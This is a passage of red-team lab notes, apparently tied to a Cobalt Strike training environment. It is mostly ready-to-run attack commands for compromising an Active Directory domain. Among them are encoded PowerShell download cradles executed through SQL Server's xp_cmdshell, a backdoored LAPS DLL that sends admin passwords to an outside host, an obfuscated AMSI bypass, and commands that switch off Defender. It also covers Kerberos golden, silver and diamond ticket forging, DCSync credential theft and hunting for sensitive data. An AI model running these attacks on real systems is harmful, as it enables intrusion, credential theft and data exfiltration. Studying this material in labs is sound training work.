execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:ienablexp /i:DEV\mssql_svc

# Run a command via xp_cmdshell with SQLRecon in the context of 'DEV\mssql_svc'
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:ixpcmd /i:DEV\mssql_svc /c:ipconfig
```

### Payload Beacon Deployment
```r
# 1. Identify the target hostname
beacon> run hostname
wkstn-2

# 2. Check the current user and privileges
beacon> getuid
[*] You are DEV\bfarmer (admin)

# 3. Create a firewall rule for port 8080 (for Web Delivery).
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

# 4. Reverse Port Forward from 8080 to 80 on the teamserver
beacon> rportfwd 8080 127.0.0.1 80

# 5. Set a `smb_x64.ps1 (/b)` Scripted Web Delivery in the Beacon, with the cradle pointing to port 80, or adjusted to port 8080 if local:
# IEX (new-object net.webclient).downloadstring("http://10.10.123.102:8080/b")

# Base64: SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA=

# 6. Use xp_cmdshell to run the Base64 encoded payload from the SQL server
SQL> EXEC xp_cmdshell 'powershell -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA=';

# or with SQLRecon:
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:ixpcmd /i:DEV\mssql_svc /c:"powershell -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA="

# 7. Link with the new Beacon from the SQL server
beacon> link sql-2.dev.cyberbotic.io TSVCPIPE-89dd8075-89e1-4dc8-aeab-dde50401337
```

## MS SQL Lateral Movement

### Manual Way
```r
# 1. Check any existing links
SELECT srvname, srvproduct, rpcout FROM master..sysservers;

# 2. Pass queries to linked servers with OpenQuery
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');

# 3. Enable xp_cmdshell on a linked server (if RPC Out is enabled)
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io];
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io];
```

### SQLRecon
```r
# 1. Discover existing links
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:links

# 2. Send queries to linked servers
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:lquery /l:sql-1.cyberbotic.io /c:"select @@servername"

# 3. Check xp_cmdshell on the linked server
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:lquery /l:sql-1.cyberbotic.io /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"

# 4. Enumerate further linked servers from sql-1
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:llinks /l:sql-1.cyberbotic.io

# 5. Identify our privileges on sql-1
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:lwhoami /l:sql-1.cyberbotic.io
```

### PowerUPSQL
```r
# Perform a link crawl with PowerUpSQL
beacon> powershell Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"
```

### Payload Beacon Deployment for Lateral Movement
```r
# 1. Identify the target
beacon> run hostname
sql-2

# 2. Check privileges
beacon> getuid
[*] You are DEV\mssql_svc (admin)

# 3. Open inbound firewall on 8080
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080

# 4. Possibly remove or check existing tunnels
beacon> rportfwd 8080 127.0.0.1 80

# 5. Configure a `smb_x64.ps1 (/c)` in Beacon and host it
# Then run the command in the linked server via xp_cmdshell or `SQLRecon lquery/ixpcmd`

# 6. Example using OpenQuery
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADIALgAyADUAOgA4ADAAOAAwAC8AYwAiACkA''')

# or
EXEC('xp_cmdshell ''powershell -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADIALgAyADUAOgA4ADAAOAAwAC8AYwAiACkA''') AT [sql-1.cyberbotic.io]

# or with SQLRecon
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:lxpcmd /l:sql-1.cyberbotic.io /c:'powershell -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADIALgAyADUAOgA4ADAAOAAwAC8AYwAiACkA'

# 7. Connect once the payload is executed
beacon> link sql-1.cyberbotic.io TSVCPIPE-89dd8075-89e1-4dc8-aeab-dde50401337
```

## MS SQL Privilege Escalation
```r
# 1. Verify the user in use and their privileges
# The instance runs as NT Service\MSSQLSERVER by default
beacon> getuid
[*] You are NT Service\MSSQLSERVER

# 2. Check token privileges with Seatbelt
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges

# 3. Configure a tcp-local_x64.ps1 (/d) listener and cradle
# Example: "IEX (new-object net.webclient).downloadstring('http://sql-2.dev.cyberbotic.io:8080/d')"

# 4. Exploit `SeImpersonatePrivilege` with SweetPotato for System
beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwBzAHEAbAAtADIALgBkAGUAdgAuAGMAdQBiAGUAcgBiAG8AdABpAGMALgBpAG8AOgA4ADAAOAAwAC8AZAAiACkA"

# 5. Connect to the new elevated beacon
beacon> connect localhost 4444
```

---

# Configuration Manager

## Enumeration
```r
## SCCM Enumeration

# 1. Identify local hostname
beacon> run hostname
wkstn-2

# 2. Current user
beacon> getuid
[*] You are DEV\bfarmer

# 3. Discover the Management Point and Site Code
# Does not require domain or SCCM privileges
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local site-info --no-banner

# 4. Check DACL in `CN=System Management` in AD for Full Control machines
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get site-info -d cyberbotic.io --no-banner

# 5. Enumerate all SCCM Collections visible with the user bfarmer
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner

# 6. Switch user to jking if needed and enumerate again
beacon> make_token DEV\jking Qwerty123
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner

# 7. Identify SCCM admin users
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get class-instances SMS_Admin --no-banner

# 8. Enumerate members of a specific collection
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collection-members -n DEV --no-banner

# 9. Get device details
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner

# 10. Hunt for user sessions in SCCM data
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -u nlamb -p IPAddresses -p IPSubnets -p Name --no-banner
```

## Network Access Account Credentials
```r
## Retrieve NAA Credentials

# 1. Check privileges
beacon> getuid
[*] You are DEV\bfarmer (admin)

# 2. Retrieve NAA credentials with local wmi method
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m wmi --no-banner
# Output example:
# NetworkAccessUsername: cyberbotic.io\sccm_svc
# NetworkAccessPassword: Cyberb0tic

# 3. Use these credentials to impersonate
beacon> make_token cyberbotic.io\sccm_svc Cyberb0tic
beacon> ls \\dc-1.cyberbotic.io\c$

# Note: these creds usually have read access, but might be overprivileged in some cases
```

## Lateral Movement via SCCM
```r
# 1. Execute a command on every device in the DEV collection
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.exe --no-banner

# 2. Force execution as SYSTEM with `-s`
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p "C:\Windows\System32\cmd.exe /c start /b \\dc-2\software\dns_x64.exe" -s --no-banner
```

---

# Domain Dominance

```r
+-----------+--------------------------+
| Technique | Required Service Tickets |
+-----------+--------------------------+
| psexec    | HOST & CIFS              |
| winrm     | HOST & HTTP              |
| dcsync    | LDAP                     |
+-----------+--------------------------+
```

## Silver Ticket
```r
# 1. Obtain user/machine's AES or RC4 key from Mimikatz or dcsync.
# 2. Generate a Silver Ticket offline with Rubeus using that key.
PS> Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:<KEY> /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

# 3. Inject the TGS into a new session
beacon> execute-assembly Rubeus.exe createnetonly /program:cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD[...]MuaW8=

# 4. Steal the token, then access the remote share
beacon> steal_token 5668
beacon> ls \\wkstn-1.dev.cyberbotic.io\c$
```

## Golden Ticket
```r
# 1. Obtain the KRBTGT hash from dcsync
beacon> dcsync dev.cyberbotic.io DEV\krbtgt

# 2. Generate the Golden Ticket offline with Rubeus
PS> Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

# 3. Inject the Golden Ticket
beacon> execute-assembly Rubeus.exe createnetonly /program:cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

# 4. Steal the token and verify
beacon> steal_token 5060
beacon> run klist
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```

## Diamond Ticket
```r
# 1. Use Rubeus diamond with /tgtdeleg to get a TGT for your user and add group SIDs
PS> Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:<KRBTGT HASH> /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

# 2. In the new session:
beacon> execute-assembly Rubeus.exe createnetonly /program:cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFYj[...snip...]MuSU8=

# 3. Steal token
beacon> steal_token 5060
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```

## Forged Certificates
```r
# 1. Move laterally or become SYSTEM on the DC/CA
beacon> jump psexec64 dc-2

# 2. Extract the CA private key and certificate
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine

# 3. Save as .pem and convert to .pfx
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# 4. Use the stolen CA to forge a certificate for "nlamb"
PS> .\ForgeCert.exe --CaCertPath cert.pfx --CaCertPassword 3kyRoad2CRTO --Subject "CN=User" --SubjectAltName "nlamb" --NewCertPath nlamb.pfx --NewCertPassword 3kyRoad2CRTO

# 5. Base64-encode and request a TGT
beacon> execute-assembly Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate:MIIC7[...]= /password:3kyRoad2CRTO /nowrap

# 6. In the new session
beacon> execute-assembly Rubeus.exe createnetonly /program:cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIF[LZSNIPPED]5pbw==

beacon> steal_token 5060
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```

---

# Forest & Domain Trusts

## Enumeration
```r
# 1. Check the current user
beacon> getuid
[*] You are DEV\bfarmer

# 2. Enumerate trust relationships in the current domain (use -Domain for others)
beacon> powerpick Get-DomainTrust
```

## Parent / Child

### Golden Ticket
```r
## Escalate from child domain to parent domain using SID History with a Golden Ticket

# 1. Get info from the parent domain, e.g. Domain Admins SID
beacon> powerpick Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid

# 2. Create the Golden Ticket offline
PS> Rubeus.exe golden /aes256:<CHILD KRBTGT> /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /sids:S-1-5-21-2594061375-675613155-814674916-512 /nowrap

# 3. Inject and create the session
beacon> execute-assembly Rubeus.exe createnetonly /program:cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

# 4. Steal token and check resources in the parent domain
beacon> steal_token 5060
beacon> ls \\dc-1.cyberbotic.io\c$

# 5. For final domain ownership:
beacon> dcsync cyberbotic.io cyber\krbtgt
```

### Diamond Ticket
```r
# Similar approach, adding Enterprise Admin SID to the child domain TGT

PS C:\Users\Attacker> Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-2594061375-675613155-814674916-512 /krbkey:<CHILD KRBTGT> /nowrap
```

## One-Way Inbound
```r
# Exploiting inbound trusts (Our domain's users can access another domain’s resources)
# e.g., child domain dev.cyberbotic.io has an inbound trust from dev-studio.com

# 1. Enumerate the foreign domain
beacon> powerpick Get-DomainTrust
beacon> powerpick Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName

# 2. Check if we belong to or can become a user who is valid in that domain
beacon> powerpick Get-DomainForeignGroupMember -Domain dev-studio.com

# 3. If that user is a Studio Admin, retrieve the AES256 hash and request TGT
beacon> dcsync dev.cyberbotic.io dev\nlamb
beacon> execute-assembly Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /aes256:<HASH> /nowrap

# 4. Request an inter-realm TGT for dev-studio.com
beacon> execute-assembly Rubeus.exe asktgs /service:krbtgt/dev-studio.com /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFwj[...]MuaW8= /nowrap

# 5. Request a TGS in dev-studio.com for cifs/dc.dev-studio.com
beacon> execute-assembly Rubeus.exe asktgs /service:cifs/dc.dev-studio.com /domain:dev-studio.com /dc:dc.dev-studio.com /ticket:doIFoz[...]NPTQ== /nowrap

# 6. Inject the cross-domain TGS
beacon> execute-assembly Rubeus.exe createnetonly /program:cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

# 7. Steal token and do a directory listing
beacon> steal_token 5060
beacon> ls \\dc.dev-studio.com\c$
```

## One-Way Outbound
```r
# Exploiting outbound trusts (Another domain’s users can access our domain)
# e.g. MSP.ORG is the external domain, trusting CYBERBOTIC.IO

# 1. Check the trust direction
beacon> powerpick Get-DomainTrust -Domain cyberbotic.io

# 2. Retrieve the TDO object (trustedDomain) and its key
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection

# 3. Move to the DC or do a DCSync for the TDO’s shared secret
beacon> mimikatz lsadump::trust /patch
# or
beacon> mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}

# 4. The trust account in msp.org has the name CYBER$. We can Overpass the Hash with that TDO hash:
beacon> execute-assembly Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:<TDO_NTLM> /nowrap

# 5. In a netonly session:
beacon> execute-assembly Rubeus.exe createnetonly /program:cmd.exe /domain:MSP /username:CYBER$ /password:FakePass /ticket:doIFGD<SNIPPED>3Aub3Jn

# 6. Steal the token and explore msp.org
beacon> steal_token 5060
beacon> run klist
beacon> powerpick Get-Domain -Domain msp.org
```

---

# Local Administrator Password Solution

## LAPS Enumeration
```r
# 1. Check if the LAPS client is installed
beacon> ls C:\Program Files\LAPS\CSE

# 2. Identify computer objects with ms-Mcs-AdmPwd + ms-Mcs-AdmPwdExpirationTime
beacon> powerpick Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName

# 3. Check LAPS GPOs
beacon> powerpick Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select displayname, name, GPCFileSysPath
beacon> download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol

# 4. Inspect the .pol
PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol
```

## Reading ms-Mcs-AdmPwd
```r
# 1. Identify who can read LAPS passwords
beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier

# 2. Use LAPSToolkit
beacon> powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
beacon> powerpick Find-LAPSDelegatedGroups
beacon> powerpick Find-AdmPwdExtendedRights

# 3. Read the LAPS password for a specific host
beacon> powerpick Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd

# 4. Use the retrieved local admin password
beacon> make_token .\LapsAdmin 1N3FyjJR5L18za
beacon> ls \\wkstn-1\c$
```

## Password Expiration Protection
```r
# 1. Check hostname and privileges
beacon> run hostname
wkstn-1
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM

# 2. Retrieve the ms-Mcs-AdmPwd + ms-Mcs-AdmPwdExpirationTime
beacon> powerpick Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime

# 3. Set a future expiry date for the LAPS password (only the machine can set its own attribute)
beacon> powerpick Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose
```

## LAPS Backdoors
```r
# 1. Modify the .DLLs AdmPwd.PS.dll and AdmPwd.Utils.dll in:
# C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\

# 2. Download them, use dnSpy to insert code that exfiltrates the password every time an admin queries it
// Example snippet:
using (var client = new WebClient())
{
    client.BaseAddress = "http://nicekviper.com";
    try
    {
        client.DownloadString($"?computer={passwordInfo.ComputerName}&pass={passwordInfo.Password}");
    }
    catch { }
}

# 3. Re-upload the patched DLLs
beacon> upload C:\Users\Attacker\Desktop\AdmPwd.PS.dll

# 4. Check digital signatures
beacon> powershell Get-AuthenticodeSignature *.dll

# 5. Test the backdoor
PS C:\Users\nlamb> Get-AdmPwdPassword -ComputerName sql-2 | fl

# 6. Confirm inbound request on attacker’s side
```

---

# MS Defender Antivirus

## Malicious file detection example
```r
# Try psexec -> fails due to AV detection
beacon> ls \\fs.dev.cyberbotic.io\c$
beacon> jump psexec64 fs.dev.cyberbotic.io smb
[-] Could not start service 633af16 on fs.dev.cyberbotic.io: 225

# "225" => The file contains a virus or PUA
net helpmsg 225
```
```r
# If we copy the payload locally, we see detection logs
PS C:\Users\Attacker> copy C:\Payloads\smb_x64.svc.exe .\Desktop\
PS C:\Users\Attacker> Get-MpThreatDetection | sort $_.InitialDetectionTime | select -First 1
```
For AMSI detection, look for `amsi:` logs.

## Artifact Kit
```r
# Found at C:\Tools\cobaltstrike\arsenal-kit\kits\artifact
# src-main for each artifact type
# src-common for code used by them

# Example build command:
./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts

# This yields multiple artifact32.dll, artifact64.exe, etc.

# Then load artifact.cna in Script Manager
```

### Modifying patch.c / bypass-pipe.c
*(Translation: adding junk code or changing strings to help with AV signature evasion, etc.)*

## Resource Kit
```r
# Used for script-based artifacts (PowerShell, Python, HTA, VBA)
./build.sh /mnt/c/Tools/cobaltstrike/resources
```

### ThreatCheck
```r
# For scanning with Windows Defender Real-time:
PS C:\Users\Attacker> C:\Tools\ThreatCheck\ThreatCheck.exe -f C:\Payloads\smb_x64.ps1 -e amsi
```

### Modifying a powershell script
*(Translation in comments for XOR, etc.)*

## Manual AMSI Bypass
```r
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## Behavioral Detections
```r
# Use spawnto to change the post-ex process
beacon> spawnto x64 %windir%\sysnative\dllhost.exe
beacon> spawnto x86 %windir%\syswow64\dllhost.exe
```

## Parent/Child
```r
# Use ShellWindows approach
Set shellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
Set obj = shellWindows.Item()
obj.Document.Application.ShellExecute "powershell.exe", "-nop -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbgBpAGMAawBlAGwAdgBpAHAAZQByAC4AYwBvAG0ALwBhACIAKQA=", Null, Null, 0
```

## Command Line Detections
```r
# Example: using Cobalt Strike pth vs. mimikatz pth
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
# Detected

mimikatz sekurlsa::pth /user:jking /domain:DEV /ntlm:59fc0f884922b4ce376051134c71e22c /run:notepad.exe
# Less suspicious command line
```

## Malleable C2 Profile
```r
set tasks_max_size "2097152";

stage {
    set userwx "false";
    set cleanup "true";
    set obfuscate "true";
    set module_x64 "xpsservices.dll";
}

post-ex {
    set amsi_disable "true";
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
}
```

## Disable Defender
```r
Set-MPPreference -DisableRealTimeMonitoring $true
Set-MPPreference -DisableIOAVProtection $true
Set-MPPreference -DisableIntrusionPreventionSystem $true
```

---

# Data Exfiltration

## File Shares
```r
# Enumerate shares
beacon> powerpick Invoke-ShareFinder
beacon> powerpick Invoke-FileFinder
beacon> powerpick Get-FileNetServer
beacon> shell findstr /S /I cpassword \\dc.organicsecurity.local\sysvol\organicsecurity.local\policies\*.xml
beacon> Get-DecryptedCpassword

# Look for valuable info
beacon> powerpick Find-DomainShare -CheckShareAccess
beacon> powerpick Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*
beacon> powerpick gc \\fs.dev.cyberbotic.io\finance$\export.csv | select -first 5
```

## Databases
```r
# Searching for sensitive data in accessible DBs
beacon> powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,address,credit,card" -SampleSize 5 | select instance, database, column, sample | ft -autosize

# Searching via linked DB
beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"

beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns where table_name=''employees''')"

beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 first_name,gender,sort_code from master.dbo.employees')"
```